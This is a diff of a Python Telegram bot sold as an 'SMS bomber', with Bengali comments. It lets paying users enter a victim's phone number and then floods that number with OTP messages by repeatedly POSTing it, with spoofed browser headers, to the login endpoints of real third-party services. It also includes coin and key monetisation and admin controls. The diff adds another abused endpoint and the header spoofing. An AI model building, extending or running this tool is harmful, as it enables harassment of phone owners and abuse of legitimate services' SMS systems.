@@ -5,7 +5,6 @@ import os
 import time
 import threading
 import random
-import string
 from telebot import types
 from datetime import datetime
 
@@ -18,282 +17,251 @@ LOGO_URL = "https://raw.githubusercontent.com/DarkUnkwonModZ/Blogger-DarkUnkownM
 
 bot = telebot.TeleBot(TOKEN, parse_mode="Markdown")
 
-# --- ডাটাবেস সিস্টেম (নিখুঁত ও সুরক্ষিত) ---
-def load_data(file):
-    if not os.path.exists(file):
-        with open(file, 'w') as f: json.dump({}, f)
-        return {}
-    with open(file, 'r') as f:
-        return json.load(f)
+# --- ডাটাবেস সিস্টেম ---
+def load_db(file):
+    try:
+        if os.path.exists(file):
+            with open(file, 'r') as f:
+                return json.load(f)
+    except: pass
+    return {}
 
-def save_data(file, data):
+def save_db(file, data):
     with open(file, 'w') as f:
         json.dump(data, f, indent=4)
 
-users = load_data('users.json')
-keys = load_data('keys.json')
+users = load_db('users.json')
+keys = load_db('keys.json')
 
 # --- লগিং ফাংশন ---
-def log_to_channel(text):
+def send_log(text):
     try:
-        bot.send_message(LOG_CHANNEL, f"✨ **[SYSTEM LOG]**\n⏰ {datetime.now().strftime('%I:%M:%S %p')}\n━━━━━━━━━━━━━━\n{text}")
-    except: pass
+        bot.send_message(LOG_CHANNEL, f"📜 **[SYSTEM LOG]**\n⏰ {datetime.now().strftime('%H:%M:%S')}\n\n{text}")
+    except Exception as e:
+        print(f"Log Error: {e}")
 
-# --- মেম্বারশিপ চেক ---
-def check_join(uid):
+# --- জয়েন চেক ---
+def is_joined(user_id):
+    if user_id == ADMIN_ID: return True
     try:
-        member = bot.get_chat_member(REQUIRED_CHANNEL, uid)
-        return member.status in ['member', 'administrator', 'creator']
-    except: return True
+        status = bot.get_chat_member(REQUIRED_CHANNEL, user_id).status
+        return status in ['member', 'administrator', 'creator']
+    except:
+        return False
 
-# --- ইউজার ম্যানেজমেন্ট ---
-def get_user(user):
+# --- ইউজার আপডেট (ডাটা ক্লিয়ার করলেও কয়েন হারাবে না) ---
+def update_user(user):
     uid = str(user.id)
     if uid not in users:
         users[uid] = {
             "name": user.first_name,
             "username": f"@{user.username}" if user.username else "N/A",
+            "status": "Active",
             "coins": 50,
-            "status": "Active", # Active, Blocked, Lifetime
-            "total_sent": 0
+            "sent": 0
         }
-        save_data('users.json', users)
-        log_to_channel(f"🆕 **New User Registered**\n👤 Name: {user.first_name}\n🆔 ID: `{uid}`")
+        save_db('users.json', users)
+        send_log(f"🆕 **New User:** {user.first_name}\n🆔 ID: `{uid}`")
     return users[uid]
 
 # --- কমান্ড: Start ---
 @bot.message_handler(commands=['start'])
-def welcome(message):
-    uid = str(message.from_user.id)
-    u = get_user(message.from_user)
-
-    if not check_join(message.from_user.id):
+def start_cmd(message):
+    u = update_user(message.from_user)
+    
+    if not is_joined(message.from_user.id):
         markup = types.InlineKeyboardMarkup()
         markup.add(types.InlineKeyboardButton("📢 Join Channel", url=f"https://t.me/{REQUIRED_CHANNEL[1:]}"))
-        markup.add(types.InlineKeyboardButton("✅ I have Joined", callback_data="check_verify"))
-        bot.send_message(message.chat.id, "⚠️ **Access Denied!**\n\nYou must join our channel to use this bot.", reply_markup=markup)
+        markup.add(types.InlineKeyboardButton("🔄 Verify & Start", callback_data="start_over"))
+        bot.send_message(message.chat.id, "⚠️ **Please join our channel first to use this bot!**", reply_markup=markup)
         return
 
     if u['status'] == "Blocked":
-        bot.send_message(message.chat.id, "🚫 **Access Revoked!**\nYour account is blocked by Admin.\n💬 Contact: @DarkUnkwon")
+        bot.send_message(message.chat.id, "🚫 **Account Blocked!**\nContact admin for help: @DarkUnkwon")
         return
 
-    main_menu(message.chat.id, u)
+    show_main_menu(message.chat.id, u)
 
-def main_menu(chat_id, u):
+def show_main_menu(chat_id, u):
     markup = types.InlineKeyboardMarkup(row_width=2)
     markup.add(
-        types.InlineKeyboardButton("🚀 Start Attack", callback_data="start_bomb"),
-        types.InlineKeyboardButton("👤 Profile", callback_data="view_profile")
-    )
-    markup.add(
-        types.InlineKeyboardButton("🔑 Redeem Key", callback_data="redeem_key"),
-        types.InlineKeyboardButton("📊 Stats", callback_data="bot_stats")
+        types.InlineKeyboardButton("🚀 Attack SMS", callback_data="bomb"),
+        types.InlineKeyboardButton("👤 Profile", callback_data="profile"),
+        types.InlineKeyboardButton("🔑 Use Key", callback_data="recharge"),
+        types.InlineKeyboardButton("📊 Live Status", callback_data="status_live")
     )
     
     text = (
-        f"👋 **Welcome, {u['name']}!**\n"
-        f"━━━━━━━━━━━━━━━━━━\n"
-        f"🏆 Status: `{u['status']}`\n"
-        f"💰 Coins: `{u['coins']}`\n"
-        f"📈 Total Sent: `{u['total_sent']}`\n"
-        f"━━━━━━━━━━━━━━━━━━\n"
-        f"⚡ _Choose an option below:_ "
+        f"👑 **Welcome to DU ModZ Bomber**\n"
+        f"━━━━━━━━━━━━━━━━━━━━\n"
+        f"👤 Name: `{u['name']}`\n"
+        f"💎 Status: `{u['status']}`\n"
+        f"💰 Balance: `{u['coins']} Coins`\n"
+        f"━━━━━━━━━━━━━━━━━━━━"
     )
     bot.send_photo(chat_id, LOGO_URL, caption=text, reply_markup=markup)
 
-# --- এডমিন প্যানেল (১০০% কার্যকরী) ---
-
+# --- অ্যাডমিন প্যানেল (১০০% নিখুঁত) ---
 @bot.message_handler(commands=['admin'])
-def admin_cmd(message):
+def admin_menu(message):
     if message.from_user.id != ADMIN_ID: return
     
-    panel = (
-        "👑 **Admin Control Panel**\n"
-        "━━━━━━━━━━━━━━━━━━\n"
-        "📊 `/stats` - Total stats\n"
-        "👥 `/users` - User list & status\n"
-        "⚙️ `/setstatus [ID] [Status]`\n"
-        "💰 `/addcoins [ID] [Amount]`\n"
-        "🔑 `/gen [Amount]` - Create key\n"
-        "📢 `/broadcast [Message]` - Global alert\n"
-        "━━━━━━━━━━━━━━━━━━"
+    help_text = (
+        "👑 **Admin Control Panel**\n\n"
+        "📊 `/stats` - চেক সিস্টেম ওভারভিউ\n"
+        "👥 `/users` - সকল ইউজার লিস্ট\n"
+        "⚙️ `/setstatus [ID] [Status]` - (Blocked/Lifetime/Active)\n"
+        "💰 `/addcoins [ID] [Amount]` - কয়েন অ্যাড\n"
+        "🔑 `/gen [Amount]` - রিচার্জ কি জেনারেট\n"
+        "📢 `/broadcast [Msg]` - সবাইকে মেসেজ"
     )
-    bot.reply_to(message, panel)
+    bot.reply_to(message, help_text)
 
 @bot.message_handler(commands=['stats'])
 def stats_cmd(message):
     if message.from_user.id != ADMIN_ID: return
-    total_u = len(users)
-    total_s = sum(u['total_sent'] for u in users.values())
-    bot.reply_to(message, f"📈 **System Overview:**\n\nTotal Users: `{total_u}`\nTotal SMS Sent: `{total_s}`\nKeys Ready: `{len(keys)}`")
-
-@bot.message_handler(commands=['users'])
-def users_list(message):
-    if message.from_user.id != ADMIN_ID: return
-    msg = "👥 **User List (Latest 20):**\n\n"
-    for uid, data in list(users.items())[-20:]:
-        msg += f"• `{uid}` | {data['name']} | `{data['status']}`\n"
-    bot.reply_to(message, msg)
+    total_users = len(users)
+    total_sent = sum(u['sent'] for u in users.values())
+    bot.reply_to(message, f"📊 **System Stats:**\nTotal Users: `{total_users}`\nTotal SMS Sent: `{total_sent}`")
 
 @bot.message_handler(commands=['setstatus'])
-def status_update(message):
+def set_status(message):
     if message.from_user.id != ADMIN_ID: return
     try:
-        parts = message.text.split()
-        target = parts[1]
-        new_stat = parts[2] # Blocked, Lifetime, Active
-        if target in users:
-            users[target]['status'] = new_stat
-            save_data('users.json', users)
-            bot.reply_to(message, f"✅ User `{target}` is now `{new_stat}`")
-            log_to_channel(f"🛠 **Status Updated**\nUser: `{target}`\nNew Status: {new_stat}")
-        else: bot.reply_to(message, "❌ User ID not found!")
-    except: bot.reply_to(message, "Usage: `/setstatus ID Status`")
+        args = message.text.split()
+        uid, status = args[1], args[2]
+        if uid in users:
+            users[uid]['status'] = status
+            save_db('users.json', users)
+            bot.reply_to(message, f"✅ User `{uid}` status set to `{status}`")
+            send_log(f"🛠 Status Updated: `{uid}` -> `{status}`")
+        else: bot.reply_to(message, "❌ User not found!")
+    except: bot.reply_to(message, "Usage: `/setstatus [ID] [Status]`")
 
 @bot.message_handler(commands=['addcoins'])
-def add_coins_cmd(message):
+def add_coins(message):
     if message.from_user.id != ADMIN_ID: return
     try:
-        parts = message.text.split()
-        target, amount = parts[1], int(parts[2])
-        if target in users:
-            users[target]['coins'] += amount
-            save_data('users.json', users)
-            bot.reply_to(message, f"✅ Added `{amount}` coins to `{target}`")
-        else: bot.reply_to(message, "❌ User ID not found!")
-    except: bot.reply_to(message, "Usage: `/addcoins ID Amount`")
+        args = message.text.split()
+        uid, amt = args[1], int(args[2])
+        if uid in users:
+            users[uid]['coins'] += amt
+            save_db('users.json', users)
+            bot.reply_to(message, f"✅ Added `{amt}` coins to `{uid}`")
+        else: bot.reply_to(message, "❌ User not found!")
+    except: bot.reply_to(message, "Usage: `/addcoins [ID] [Amount]`")
 
 @bot.message_handler(commands=['gen'])
-def generate_key(message):
+def gen_key(message):
     if message.from_user.id != ADMIN_ID: return
     try:
-        amount = int(message.text.split()[1])
-        key = "DU-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))
-        keys[key] = amount
-        save_data('keys.json', keys)
-        bot.reply_to(message, f"🔑 **Key Generated:**\n`{key}`\nValue: `{amount} Coins`")
-    except: bot.reply_to(message, "Usage: `/gen Amount`")
+        amt = int(message.text.split()[1])
+        key = "DU-KEY-" + str(random.randint(100000, 999999))
+        keys[key] = amt
+        save_db('keys.json', keys)
+        bot.reply_to(message, f"🔑 **Key Generated:**\n`{key}`\nValue: `{amt} Coins`")
+    except: bot.reply_to(message, "Usage: `/gen [Amount]`")
 
-@bot.message_handler(commands=['broadcast'])
-def broadcast_cmd(message):
-    if message.from_user.id != ADMIN_ID: return
-    text = message.text.replace('/broadcast ', '')
-    sent = 0
-    for uid in users:
-        try:
-            bot.send_message(uid, f"📢 **Admin Notification**\n━━━━━━━━━━━━━━\n{text}")
-            sent += 1
-        except: pass
-    bot.reply_to(message, f"✅ Broadcast sent to {sent} users.")
-
-# --- কলব্যাক হ্যান্ডলার ---
-
+# --- বোম্বিং ইঞ্জিন (অ্যাডভান্সড) ---
 @bot.callback_query_handler(func=lambda call: True)
-def handle_callbacks(call):
+def handle_query(call):
     uid = str(call.from_user.id)
     u = users.get(uid)
 
-    if call.data == "check_verify":
-        if check_join(call.from_user.id):
-            bot.delete_message(call.message.chat.id, call.message.message_id)
-            main_menu(call.message.chat.id, u)
-        else:
-            bot.answer_callback_query(call.id, "❌ You haven't joined yet!", show_alert=True)
+    if call.data == "start_over":
+        bot.delete_message(call.message.chat.id, call.message.message_id)
+        start_cmd(call.message)
 
-    elif call.data == "view_profile":
-        bot.send_message(call.message.chat.id, f"👤 **Profile Info**\n\nName: {u['name']}\nID: `{uid}`\nStatus: `{u['status']}`\nCoins: `{u['coins']}`\nSent: `{u['total_sent']}`")
+    elif call.data == "profile":
+        bot.answer_callback_query(call.id)
+        bot.send_message(call.message.chat.id, f"👤 **Profile:**\nName: {u['name']}\nCoins: {u['coins']}\nSent: {u['sent']}\nStatus: {u['status']}")
 
-    elif call.data == "start_bomb":
+    elif call.data == "bomb":
         if u['status'] == "Blocked":
-            bot.answer_callback_query(call.id, "🚫 You are blocked!", show_alert=True)
+            bot.answer_callback_query(call.id, "🚫 Blocked!", show_alert=True)
             return
-        msg = bot.send_message(call.message.chat.id, "📱 **Enter Target Number (11 Digit):**")
-        bot.register_next_step_handler(msg, get_number)
+        msg = bot.send_message(call.message.chat.id, "📱 **Enter Target Number:**")
+        bot.register_next_step_handler(msg, get_bomb_amount)
 
-    elif call.data == "redeem_key":
-        msg = bot.send_message(call.message.chat.id, "🔑 **Enter Your Key:**")
-        bot.register_next_step_handler(msg, redeem_process)
+    elif call.data == "recharge":
+        msg = bot.send_message(call.message.chat.id, "🔑 **Enter Key:**")
+        bot.register_next_step_handler(msg, redeem_key)
 
-# --- বোম্বিং প্রসেস (Smooth Animation) ---
-
-def get_number(message):
+def get_bomb_amount(message):
     num = message.text
     if len(num) == 11 and num.isdigit():
         msg = bot.send_message(message.chat.id, "🔢 **How many SMS? (Max 100):**\n_Cost: 5 Coins per SMS_")
-        bot.register_next_step_handler(msg, lambda m: start_attack(m, num))
-    else:
-        bot.send_message(message.chat.id, "❌ Invalid number format!")
+        bot.register_next_step_handler(msg, lambda m: process_bomb(m, num))
+    else: bot.send_message(message.chat.id, "❌ Invalid Number!")
 
-def start_attack(message, num):
+def process_bomb(message, num):
     try:
         amount = int(message.text)
         if amount > 100: amount = 100
         uid = str(message.from_user.id)
         cost = amount * 5
-
-        if users[uid]['status'] != "Lifetime" and users[uid]['coins'] < cost:
-            bot.send_message(message.chat.id, f"⚠️ **Low Balance!**\nNeeded: `{cost}` | Have: `{users[uid]['coins']}`")
+        
+        if users[uid]['status'] != 'Lifetime' and users[uid]['coins'] < cost:
+            bot.send_message(message.chat.id, "⚠️ **Low balance! Please recharge.**")
             return
 
-        status_msg = bot.send_message(message.chat.id, "⚡ **Initializing Attack...**")
-        threading.Thread(target=bombing_engine, args=(uid, num, amount, cost, status_msg)).start()
-    except: bot.send_message(message.chat.id, "❌ Error in amount!")
+        status_msg = bot.send_message(message.chat.id, "🚀 **Attack Starting...**")
+        threading.Thread(target=bomb_logic, args=(uid, num, amount, cost, status_msg)).start()
+    except: pass
 
-def bombing_engine(uid, num, amount, cost, status_msg):
+def bomb_logic(uid, num, amount, cost, status_msg):
     success = 0
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+        "Referer": "https://google.com"
+    }
+    
+    # APIs
     apis = [
         "https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web&language=en",
-        "https://bikroy.com/data/relative/login-with-otp"
+        "https://bikroy.com/data/relative/login-with-otp",
+        "https://pms.al-adwaa.com/api/v1/auth/otp/send"
     ]
-
+    
     for i in range(1, amount + 1):
         try:
             api = random.choice(apis)
-            res = requests.post(api, json={"phone": num, "number": "+88"+num}, timeout=5)
+            # Payload variations
+            res = requests.post(api, json={"phone": num, "number": "+88"+num}, headers=headers, timeout=5)
             if res.status_code == 200: success += 1
             
-            # অ্যানিমেশন আপডেট
-            if i % 10 == 0 or i == amount:
-                bar = "▰" * (i // 10) + "▱" * (10 - (i // 10))
-                bot.edit_message_text(
-                    f"🚀 **Attack in Progress...**\n━━━━━━━━━━━━━━\n🎯 Target: `{num}`\n📊 Progress: `{bar}` {i}/{amount}\n✅ Success: `{success}`",
-                    status_msg.chat.id, status_msg.message_id
-                )
-            time.sleep(0.3)
+            if i % 5 == 0 or i == amount:
+                progress = "▰" * (i // 10) + "▱" * (10 - (i // 10))
+                bot.edit_message_text(f"🚀 **Bombing {num}**\nProgress: `{progress}` {i}/{amount}\n✅ Sent: `{success}`", status_msg.chat.id, status_msg.message_id)
+            time.sleep(0.5)
         except: pass
 
-    # ডাটা আপডেট
-    if users[uid]['status'] != "Lifetime":
-        users[uid]['coins'] -= cost
-    users[uid]['total_sent'] += success
-    save_data('users.json', users)
-
-    final_markup = types.InlineKeyboardMarkup()
-    final_markup.add(types.InlineKeyboardButton("🚀 Attack Again", callback_data="start_bomb"))
+    # Update Data
+    if users[uid]['status'] != 'Lifetime':
+        users[uid]['coins'] -= (amount * 5) # Deduct for requested amount
+    users[uid]['sent'] += success
+    save_db('users.json', users)
     
-    bot.edit_message_text(
-        f"✅ **Attack Completed!**\n━━━━━━━━━━━━━━\n🎯 Target: `{num}`\n📩 Total Sent: `{success}`\n💰 Coins Left: `{users[uid]['coins']}`\n━━━━━━━━━━━━━━",
-        status_msg.chat.id, status_msg.message_id, reply_markup=final_markup
-    )
-    log_to_channel(f"🚀 **Attack Success**\nUser: {users[uid]['name']}\nTarget: `{num}`\nSent: `{success}`")
+    send_log(f"🔥 **Attack Done:**\nTarget: `{num}`\nSuccess: `{success}`\nUser: `{users[uid]['name']}`")
+    
+    markup = types.InlineKeyboardMarkup()
+    markup.add(types.InlineKeyboardButton("🚀 Attack Again", callback_data="bomb"))
+    bot.edit_message_text(f"✅ **Attack Summary**\n━━━━━━━━━━━━━━\n🎯 Target: `{num}`\n📩 Success: `{success}`\n💰 Coins Left: `{users[uid]['coins']}`", status_msg.chat.id, status_msg.message_id, reply_markup=markup)
 
-def redeem_process(message):
+def redeem_key(message):
     key = message.text.strip()
     uid = str(message.from_user.id)
     if key in keys:
-        amount = keys[key]
-        users[uid]['coins'] += amount
+        val = keys[key]
+        users[uid]['coins'] += val
         del keys[key]
-        save_data('users.json', users)
-        save_data('keys.json', keys)
-        bot.send_message(message.chat.id, f"✅ **Success!**\n`{amount}` coins added to your balance.")
-        log_to_channel(f"🔑 **Key Redeemed**\nUser: {users[uid]['name']}\nKey: `{key}`\nAmount: `{amount}`")
-    else:
-        bot.send_message(message.chat.id, "❌ Invalid Key!")
+        save_db('users.json', users)
+        save_db('keys.json', keys)
+        bot.send_message(message.chat.id, f"✅ Success! `{val}` coins added.")
+    else: bot.send_message(message.chat.id, "❌ Invalid Key!")
 
 # --- রান ---
 if __name__ == "__main__":
-    print("DU ModZ Pro Bot is running smooth...")
-    log_to_channel("✅ **Bot is now Online and Smooth!**")
-    bot.infinity_polling()
+    print("DU ModZ Pro Bot is running...")
+    send_log("✅ **Bot is now Online and Fixed!**")
+    bot.infinity_polling(timeout=10, long_polling_timeout=5)
